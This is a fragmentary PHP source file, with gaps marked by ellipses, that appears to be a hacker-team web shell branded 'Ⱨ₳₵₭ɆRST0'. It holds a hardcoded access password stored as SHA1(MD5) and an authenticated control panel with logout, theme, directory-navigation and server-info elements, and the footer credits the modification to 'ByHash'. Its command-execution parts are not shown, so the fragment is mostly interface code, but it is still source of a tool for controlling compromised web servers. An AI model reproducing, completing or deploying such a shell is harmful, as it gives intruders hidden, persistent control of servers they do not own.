...
/*
 #T3am #Ⱨ₳₵₭ɆRST0 #ByHash ;)
*/
$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // SHA1(MD5(pass))
...
<?php if($s_auth){?>
	...
	<?php }
	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>Ⱨ₳₵₭ɆRST0</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<?php }?>	</td></tr></table>
<p class='footer'>Modified ~BYHash;)&copy;<?php echo @date("Y",time())." "; ?>Ⱨ₳₵₭ɆRST0</p>
